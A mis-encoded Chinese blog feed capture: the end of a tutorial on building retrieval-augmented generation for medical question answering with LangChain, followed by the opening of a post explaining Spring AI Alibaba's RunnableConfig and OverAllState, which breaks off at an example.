    separators=[<span class="hljs-string">"\n\n"</span>, <span class="hljs-string">"\n"</span>, <span class="hljs-string">"ã€‚"</span>, <span class="hljs-string">"ï¼›"</span>] <span class="hljs-comment"># ä¸­æ–‡åˆ†éš”ç¬¦</span>
)

<span class="hljs-comment"># å¤„ç†PDFæ–‡æ¡£</span>
chunks = text_splitter.split_documents(pdf_loader(<span class="hljs-string">"medical_guidelines.pdf"</span>))
</code></pre>
<p>ğŸ“Œ <strong>é¿å‘æŒ‡å—</strong>ï¼š</p>
<ul>
<li>é¿å…ä½¿ç”¨å›ºå®šå­—ç¬¦åˆ†å—ï¼ˆä¼šåˆ‡æ–­å®Œæ•´å¥å­ï¼‰</li>
<li>æ³•å¾‹/åŒ»ç–—æ–‡æœ¬åº”å¢å¤§é‡å åŒºåŸŸï¼ˆå»ºè®®256å­—èŠ‚ï¼‰</li>
<li>æ·»åŠ å…ƒæ•°æ®æ ‡è®°æ–‡æ¡£æ¥æºç« èŠ‚</li>
</ul>
<h4 data-id="heading-9">3.3 æ£€ç´¢å¢å¼ºå®ç°æ ¸å¿ƒä»£ç </h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># RAGé“¾å®Œæ•´å®ç°ï¼ˆåŸºäºLangChainï¼‰</span>
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain_community.vectorstores <span class="hljs-keyword">import</span> Pinecone
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI, OpenAIEmbeddings

<span class="hljs-comment"># åˆå§‹åŒ–ç»„ä»¶</span>
vectorstore = Pinecone.from_existing_index(<span class="hljs-string">"medical-index"</span>, embedding=OpenAIEmbeddings())
retriever = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">3</span>}) <span class="hljs-comment"># å–TOP3ç‰‡æ®µ</span>
llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4-turbo"</span>)

<span class="hljs-comment"># å®šä¹‰æç¤ºè¯æ¨¡æ¿</span>
template = <span class="hljs-string">"""è¯·ä¸¥æ ¼æ ¹æ®ä»¥ä¸‹åŒ»å­¦èµ„æ–™å›ç­”é—®é¢˜ï¼š
{context}

é—®é¢˜ï¼š{question}
ç­”æ¡ˆå¿…é¡»åŒ…å«æ–‡çŒ®å¼•ç”¨æ ‡è®°ï¼Œå¦‚[1][2]"""</span>
prompt = ChatPromptTemplate.from_template(template)

<span class="hljs-comment"># æ„å»ºRAGé“¾</span>
chain = (
    {<span class="hljs-string">"context"</span>: retriever, <span class="hljs-string">"question"</span>: RunnablePassthrough()} 
    | prompt 
    | llm 
    | StrOutputParser()
)

<span class="hljs-comment"># ç¤ºä¾‹ä½¿ç”¨</span>
response = chain.invoke(<span class="hljs-string">"ç³–å°¿ç—…æ‚£è€…ä½¿ç”¨äºŒç”²åŒèƒçš„ç¦å¿Œç—‡æœ‰å“ªäº›ï¼Ÿ"</span>)
</code></pre>
<h4 data-id="heading-10">3.4 æ•ˆæœéªŒè¯å…³é”®æŒ‡æ ‡</h4>
<p>éƒ¨ç½²RAGåï¼Œæˆ‘ä»¬å¯¹500æ¡åŒ»å­¦é—®ç­”æµ‹è¯•é›†è¿›è¡ŒéªŒè¯ï¼š</p>





























<table><thead><tr><th>è¯„ä¼°ç»´åº¦</th><th>åŸå§‹æ¨¡å‹</th><th>RAGå¢å¼º</th><th>æå‡å¹…åº¦</th></tr></thead><tbody><tr><td>å¹»è§‰ç‡</td><td>38.2%</td><td>5.7%</td><td>â–¼85%</td></tr><tr><td>äº‹å®å‡†ç¡®ç‡</td><td>61.8%</td><td>90.3%</td><td>â–²47%</td></tr><tr><td>ç”¨æˆ·æ»¡æ„åº¦</td><td>2.8/5</td><td>4.5/5</td><td>â–²61%</td></tr></tbody></table>
<h3 data-id="heading-11">å››ã€ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–ç­–ç•¥</h3>
<h4 data-id="heading-12">4.1 æ··åˆæ£€ç´¢æ¶æ„</h4>
<p>å•ä¸€å‘é‡æ£€ç´¢åœ¨ç²¾ç¡®æœ¯è¯­æŸ¥è¯¢æ—¶å¯èƒ½å¤±æ•ˆï¼Œéœ€ç»“åˆå…³é”®è¯æ£€ç´¢ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·é—®é¢˜] --&gt; B{é—®é¢˜ç±»å‹åˆ†æ}
    B --&gt;|ä¸“ä¸šæœ¯è¯­| C[å…³é”®è¯æ£€ç´¢]
    B --&gt;|è¯­ä¹‰æŸ¥è¯¢| D[å‘é‡æ£€ç´¢]
    C &amp; D --&gt; E[ç»“æœèåˆ]
    E --&gt; F[ç”Ÿæˆç­”æ¡ˆ]
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ··åˆæ£€ç´¢å®ç°</span>
<span class="hljs-keyword">from</span> langchain_community.retrievers <span class="hljs-keyword">import</span> BM25Retriever

<span class="hljs-comment"># åˆå§‹åŒ–åŒæ£€ç´¢å™¨</span>
keyword_retriever = BM25Retriever.from_texts(docs)
vector_retriever = Pinecone.from_existing_index(...)

<span class="hljs-comment"># è‡ªå®šä¹‰èåˆå™¨</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hybrid_search</span>(<span class="hljs-params">query</span>):
    keyword_results = keyword_retriever.get_relevant_documents(query)
    vector_results = vector_retriever.get_relevant_documents(query)
    <span class="hljs-keyword">return</span> fusion_results(keyword_results, vector_results)
</code></pre>
<h4 data-id="heading-13">4.2 åŠ¨æ€æ¸©åº¦è°ƒèŠ‚</h4>
<p>é€šè¿‡æ¸©åº¦å‚æ•°æ§åˆ¶ç”Ÿæˆè‡ªç”±åº¦ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ ¹æ®é—®é¢˜é£é™©çº§åˆ«è°ƒæ•´æ¸©åº¦</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">safety_aware_generation</span>(<span class="hljs-params">question</span>):
    risk_level = safety_checker(question)
    temperature = <span class="hljs-number">0.3</span> <span class="hljs-keyword">if</span> risk_level == <span class="hljs-string">"high"</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.7</span>
    <span class="hljs-keyword">return</span> llm.invoke(prompt, config={<span class="hljs-string">"temperature"</span>: temperature})
</code></pre>
<h4 data-id="heading-14">4.3 æº¯æºéªŒè¯æœºåˆ¶</h4>
<p>å¼ºåˆ¶æ¨¡å‹æ ‡æ³¨å¼•ç”¨æ¥æºï¼š</p>
<pre><code class="hljs language-python" lang="python">prompt_template = <span class="hljs-string">"""
è¯·åŸºäºä»¥ä¸‹è¯æ®å›ç­”é—®é¢˜ï¼š
{{context}}

è¦æ±‚ï¼š
1. æ¯ä¸ªåŒ»å­¦å£°æ˜å¿…é¡»æ ‡æ³¨æ¥æºç¼–å·ï¼Œå¦‚[1]
2. ç¦æ­¢æ·»åŠ ä»»ä½•éå¼•ç”¨å†…å®¹
3. è‹¥æ— æ³•å›ç­”è¯·è¯´"æ ¹æ®ç°æœ‰èµ„æ–™æ— æ³•å›ç­”"
"""</span>
</code></pre>
<h3 data-id="heading-15">äº”ã€å‰æ²¿æ‰©å±•æ–¹å‘</h3>
<h4 data-id="heading-16">5.1 è‡ªæˆ‘ä¿®æ­£RAG</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªä¿®æ­£æµç¨‹ä¼ªä»£ç </span>
initial_answer = rag_chain(question)
verification = fact_checker(question, initial_answer)
<span class="hljs-keyword">if</span> verification.confidence &lt; <span class="hljs-number">0.9</span>:
    new_context = retrieve_more_docs(verification.gaps)
    final_answer = rag_chain(question, new_context)
</code></pre>
<h4 data-id="heading-17">5.2 å¤šæ¨¡æ€RAG</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¤„ç†åŒ»å­¦å½±åƒæ–‡æœ¬</span>
image_retriever = CLIPRetriever(image_database)
text_retriever = VectorRetriever(text_database)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">multimodal_rag</span>(<span class="hljs-params">question, image=<span class="hljs-literal">None</span></span>):
    <span class="hljs-keyword">if</span> image:
        image_context = image_retriever(image)
    text_context = text_retriever(question)
    <span class="hljs-keyword">return</span> generate_with_both_contexts(image_context, text_context)
</code></pre>
<h3 data-id="heading-18">å…­ã€è¡€æ³ªæ•™è®­æ€»ç»“</h3>
<ol>
<li>
<p><strong>çŸ¥è¯†åº“æ›´æ–°æœºåˆ¶</strong>ï¼šæŸæ¬¡è¯å“è¯´æ˜ä¹¦æ›´æ–°æœªåŒæ­¥ï¼Œå¯¼è‡´ç³»ç»Ÿæ¨èç¦ç”¨è¯å‰‚</p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šå»ºç«‹çŸ¥è¯†åº“å˜æ›´è‡ªåŠ¨è§¦å‘é‡ç´¢å¼•æµæ°´çº¿</li>
</ul>
</li>
<li>
<p><strong>æ£€ç´¢å¤±è´¥å…œåº•</strong>ï¼šå½“æ£€ç´¢è¿”å›ç©ºæ—¶ï¼ŒåŸå§‹æ¨¡å‹ç›´æ¥èƒ¡ç¼–ä¹±é€ </p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šæ·»åŠ ç©ºç»“æœæ£€æµ‹ï¼Œè§¦å‘"èµ„æ–™ä¸è¶³"å“åº”æ¨¡æ¿</li>
</ul>
</li>
<li>
<p><strong>è¿‡åº¦ä¾èµ–é£é™©</strong>ï¼šåŒ»ç”Ÿå°†ç³»ç»Ÿç­”æ¡ˆè§†ä¸ºç»å¯¹çœŸç†</p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šåœ¨æ‰€æœ‰å›ç­”æ·»åŠ "æœ¬å»ºè®®éœ€ä¸“ä¸šåŒ»å¸ˆç¡®è®¤"è­¦ç¤ºè¯­</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">ä¸ƒã€æ€è€ƒé¢˜</h3>
<ol>
<li><strong>ä¼¦ç†å›°å¢ƒ</strong>ï¼šå½“RAGç³»ç»Ÿæ£€ç´¢åˆ°ç›¸äº’å†²çªçš„åŒ»å­¦æ–‡çŒ®æ—¶ï¼ˆå¦‚æ–°æ—§ç‰ˆæŒ‡å—çŸ›ç›¾ï¼‰ï¼Œç³»ç»Ÿåº”å¦‚ä½•åº”å¯¹ï¼Ÿ</li>
<li><strong>æŠ€æœ¯æé™</strong>ï¼šèƒ½å¦è®¾è®¡å‡º100%æ— å¹»è§‰çš„AIç³»ç»Ÿï¼Ÿç†è®ºä¸Šçš„ä¸å¯èƒ½æ€§æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</li>
<li><strong>æˆæœ¬å¹³è¡¡</strong>ï¼šåœ¨å®æ—¶æ€§è¦æ±‚æé«˜çš„æ€¥è¯Šåœºæ™¯ï¼Œå¦‚ä½•å¹³è¡¡RAGçš„æ£€ç´¢è€—æ—¶ä¸ç”Ÿå‘½å®‰å…¨ï¼Ÿ</li>
</ol>
<blockquote>
<p><strong>æœ€åå¿ å‘Š</strong>ï¼šRAGä¸æ˜¯æ¶ˆé™¤å¹»è§‰çš„é“¶å¼¹ï¼Œè€Œæ˜¯äººç±»æ™ºæ…§ä¸AIåä½œçš„æ¡¥æ¢ã€‚æœ€å±é™©çš„å¹»è§‰ï¼Œæ˜¯è®¤ä¸ºAIå¯ä»¥æ›¿ä»£ä¸“ä¸šåˆ¤æ–­ã€‚</p>
</blockquote>
<hr/>
<p><strong>é™„å½•ï¼šå®Œæ•´RAGç³»ç»Ÿéƒ¨ç½²æ¸…å•</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²æ£€æŸ¥è¡¨</span>
deployment_checklist = [
    <span class="hljs-string">"âœ… çŸ¥è¯†åº“ç‰ˆæœ¬é”å®šæœºåˆ¶"</span>,
    <span class="hljs-string">"âœ… æ£€ç´¢å¤±è´¥å…œåº•ç­–ç•¥"</span>,
    <span class="hljs-string">"âœ… ç”¨æˆ·é£é™©æç¤ºæ¨¡æ¿"</span>,
    <span class="hljs-string">"âœ… å®æ—¶ç›‘æ§ä»ªè¡¨ç›˜"</span>,
    <span class="hljs-string">"âœ… äººå·¥å®¡æ ¸é€šé“"</span>,
    <span class="hljs-string">"âš ï¸ å®šæœŸåŒ»å­¦ä¸“å®¶éªŒè¯"</span>
]
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig]]></title>    <link>https://juejin.cn/post/7592816646869352457</link>    <guid>https://juejin.cn/post/7592816646869352457</guid>    <pubDate>2026-01-08T07:45:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646869352457" data-draft-id="7592424951660019738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,æ¶æ„,GitHub"/> <meta itemprop="datePublished" content="2026-01-08T07:45:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:45:12.000Z" title="Thu Jan 08 2026 07:45:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ Spring AI Alibabaï¼ˆä»¥åŠæ›´å¹¿æ³›çš„ Spring AI å’Œ LangChain ç”Ÿæ€ç³»ç»Ÿï¼‰ä¸­ï¼Œ<code>RunnableConfig</code> å’Œ <code>OverallState</code>æ˜¯æ„å»ºAgentï¼ˆæ™ºèƒ½ä½“ï¼‰æˆ–Workflowï¼ˆå·¥ä½œæµï¼‰æ—¶çš„ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œé‚£å®ƒä»¬åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">RunnableConfig (è¿è¡Œæ—¶é…ç½®)</h2>
<p><code>RunnableConfig</code> æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç”¨äºåœ¨æ‰§è¡Œé“¾ï¼ˆChainï¼‰æˆ– Agent çš„å„ä¸ªæ­¥éª¤ä¹‹é—´ä¼ é€’<strong>è¿è¡Œæ—¶</strong>çš„å…ƒæ•°æ®å’Œæ§åˆ¶å‚æ•°ã€‚å®ƒç±»ä¼¼äºä¸€ä¸ªâ€œèƒŒåŒ…â€ï¼Œä¼´éšç€è¯·æ±‚åœ¨æ•´ä¸ªç³»ç»Ÿä¸­æµåŠ¨ï¼Œä½†å®ƒä¸åŒ…å«ä¸šåŠ¡æ•°æ®ï¼ŒåªåŒ…å«â€œå¦‚ä½•æ‰§è¡Œâ€çš„æŒ‡ä»¤ä¸å‚æ•°ã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒä½œç”¨ï¼š</h3>
<ol>
<li>
<p><strong>æ§åˆ¶é€’å½’ä¸å¾ªç¯ (Recursion Limit)</strong> ï¼š</p>
<ul>
<li>åœ¨ Agent å¾ªç¯ï¼ˆä¾‹å¦‚ï¼šæ€è€ƒ -&gt; å·¥å…· -&gt; æ€è€ƒï¼‰ä¸­ï¼Œä¸ºäº†é˜²æ­¢æ­»å¾ªç¯ï¼Œ<code>RunnableConfig</code> å¯ä»¥è®¾ç½®æœ€å¤§é€’å½’æ¬¡æ•°ï¼ˆä¾‹å¦‚ 25 æ¬¡ï¼‰ã€‚å¦‚æœè¶…è¿‡è¿™ä¸ªæ¬¡æ•°ï¼Œç³»ç»Ÿä¼šå¼ºåˆ¶åœæ­¢å¹¶æŠ¥é”™ã€‚</li>
</ul>
</li>
<li>
<p><strong>å›è°ƒæœºåˆ¶ (Callbacks)</strong> ï¼š</p>
<ul>
<li>å®ƒæºå¸¦äº† <code>CallbackManager</code>ã€‚ä½ å¯ä»¥é€šè¿‡å®ƒæŒ‚è½½ç›‘å¬å™¨ï¼Œç›‘æ§ Token æ¶ˆè€—ã€æµå¼è¾“å‡ºï¼ˆStreamingï¼‰ã€æˆ–è€…åœ¨æŸä¸ªæ­¥éª¤å¼€å§‹/ç»“æŸæ—¶è§¦å‘æ—¥å¿—ã€‚</li>
</ul>
</li>
<li>
<p><strong>å…ƒæ•°æ®ä¸è¿½è¸ª (Metadata &amp; Tags)</strong> ï¼š</p>
<ul>
<li>ä½ å¯ä»¥ç»™å½“å‰çš„æ‰§è¡Œè¯·æ±‚æ‰“ä¸Š <code>tags</code>ï¼ˆæ ‡ç­¾ï¼‰æˆ– <code>metadata</code>ï¼ˆå…ƒæ•°æ®ï¼‰ã€‚è¿™å¯¹äºé“¾è·¯è¿½è¸ªï¼ˆå¦‚æ¥å…¥ LangSmith æˆ– Zipkinï¼‰éå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œæ ‡è®° <code>userId: 123</code> æˆ– <code>environment: production</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¹¶å‘æ§åˆ¶ä¸è¶…æ—¶</strong>ï¼š</p>
<ul>
<li>åœ¨æŸäº›å®ç°ä¸­ï¼Œå®ƒå¯ä»¥æºå¸¦å–æ¶ˆä¿¡å·ï¼ˆCancellation Signalsï¼‰æˆ–è¶…æ—¶è®¾ç½®</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">å…³é”®ç†è§£</h3>
<p>ä½ å¯ä»¥å°†RunnableConfigç†è§£ä¸ºâ€œæ˜¾å¼çš„ã€è·¨çº¿ç¨‹å®‰å…¨çš„ ThreadLocalâ€ã€‚</p>
<p>åœ¨ Spring AI / LangChain çš„æ¶æ„ä¸­ï¼Œ<code>RunnableConfig</code> èµ·åˆ°äº†åŒæ ·çš„ä½œç”¨ï¼š</p>
<ul>
<li><strong>éšå¼ä¼ é€’</strong>ï¼šè™½ç„¶å®ƒä½œä¸ºå‚æ•°ä¼ é€’ï¼Œä½†åœ¨ Agent çš„å†…éƒ¨ç»„ä»¶ï¼ˆå¦‚å„ä¸ª Toolã€å„ä¸ª Chain èŠ‚ç‚¹ï¼‰ä¹‹é—´ï¼Œå®ƒå¾€å¾€æ˜¯ä½œä¸ºä¸€ä¸ªâ€œç¯å¢ƒä¸Šä¸‹æ–‡â€å­˜åœ¨çš„ã€‚</li>
<li><strong>å­˜æ”¾â€œå¸¦å¤–æ•°æ®â€ (Out-of-band Data)</strong> ï¼šå®ƒä¸“é—¨è®¾è®¡äº†ä¸€ä¸ª <code>metadata</code> å­—æ®µï¼ˆæ˜¯ä¸€ä¸ª Mapï¼‰ï¼Œå…è®¸ä½ å¾€é‡Œé¢å¡ä¸€äº›<strong>éä¸šåŠ¡é€»è¾‘æ ¸å¿ƒã€ä½†å…¨é“¾è·¯éƒ½éœ€è¦</strong>çš„æ•°æ®ã€‚</li>
</ul>
<h4 data-id="heading-4">å¼‚æ­¥ä¸è·¨çº¿ç¨‹å®‰å…¨æ€§ (è¿™æ˜¯æœ€å¤§çš„åŒºåˆ«)</h4>
<ul>
<li><strong>ThreadLocal</strong>: å®ƒæ˜¯ç»‘å®šåœ¨<strong>ç‰¹å®šçº¿ç¨‹</strong>ä¸Šçš„ã€‚Spring AI åº•å±‚ï¼ˆç‰¹åˆ«æ˜¯åœ¨æµå¼è¾“å‡º Streaming æˆ–è°ƒç”¨å¤§æ¨¡å‹ API æ—¶ï¼‰ç»å¸¸æ˜¯<strong>å¼‚æ­¥çš„</strong>ï¼ˆä½¿ç”¨ <code>WebFlux</code> æˆ– <code>CompletableFuture</code>ï¼‰ã€‚ä¸€æ—¦ä»£ç åˆ‡æ¢äº†çº¿ç¨‹ï¼ˆä¾‹å¦‚ä» Tomcat çº¿ç¨‹åˆ‡æ¢åˆ° Netty I/O çº¿ç¨‹ï¼‰ï¼Œ<code>ThreadLocal</code> é‡Œçš„æ•°æ®å°±ä¼šä¸¢å¤±ï¼Œé™¤éä½ åšéå¸¸å¤æ‚çš„ Context å¤åˆ¶ã€‚</li>
<li><strong>RunnableConfig</strong>: å®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„ <strong>Java å¯¹è±¡</strong>ã€‚å½“ AI ä»»åŠ¡åœ¨ä¸åŒçš„çº¿ç¨‹ã€ä¸åŒçš„ Reactor æµä¹‹é—´ä¼ é€’æ—¶ï¼Œè¿™ä¸ªå¯¹è±¡ä¼šä½œä¸ºä¸€ä¸ªå‚æ•°ä¸€ç›´è·Ÿç€èµ°ã€‚<strong>æ— è®ºçº¿ç¨‹æ€ä¹ˆåˆ‡ï¼Œæ•°æ®éƒ½åœ¨é‚£é‡Œï¼Œä¸ä¼šä¸¢ã€‚</strong></li>
</ul>
<h4 data-id="heading-5">ä½œç”¨åŸŸæ¸…æ™° (Scope)</h4>
<ul>
<li><strong>ThreadLocal</strong>: å¦‚æœå¿˜è®° <code>remove()</code>ï¼Œå®¹æ˜“é€ æˆå†…å­˜æ³„æ¼ï¼ˆMemory Leakï¼‰ï¼Œæˆ–è€…åœ¨çº¿ç¨‹æ± å¤ç”¨æ—¶é€ æˆæ•°æ®æ±¡æŸ“ï¼ˆä¸Šä¸€ä¸ªè¯·æ±‚çš„æ•°æ®ç•™åˆ°äº†ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼‰ã€‚</li>
<li><strong>RunnableConfig</strong>: å®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸¥æ ¼ç»‘å®šåœ¨å•æ¬¡æ‰§è¡Œé“¾ï¼ˆRunï¼‰ä¸Šã€‚ä¹Ÿå°±æ˜¯ <code>agent.invoke()</code> ç»“æŸï¼Œè¿™ä¸ª Config å¯¹è±¡ä¹Ÿå°±å®Œæˆäº†ä½¿å‘½ï¼Œè¢« GC å›æ”¶ï¼Œéå¸¸å¹²å‡€</li>
</ul>
<h3 data-id="heading-6">ç¤ºä¾‹</h3>
<p>ä¸‹é¢æ˜¯Spring AI Alibabaçš„ä¸€æ®µç¤ºä¾‹</p>
<ol>
<li>
<p>ä» <code>toolContext.getContext()</code> ä¸­å–å‡º <code>RunnableConfig</code></p>
</li>
<li>
<p>ä»ä¸­è¯»å– <code>metadata("user_id")</code></p>
</li>
<li>
<p>æ ¹æ®user_id</p>
<p>è¿”å›ä¸åŒä½ç½®ï¼š</p>
<ul>
<li>ç”¨æˆ· ID ä¸º <code>"1"</code> â†’ <code>"Florida"</code></li>
<li>å…¶ä»– â†’ <code>"San Francisco"</code></li>
</ul>
</li>
</ol>
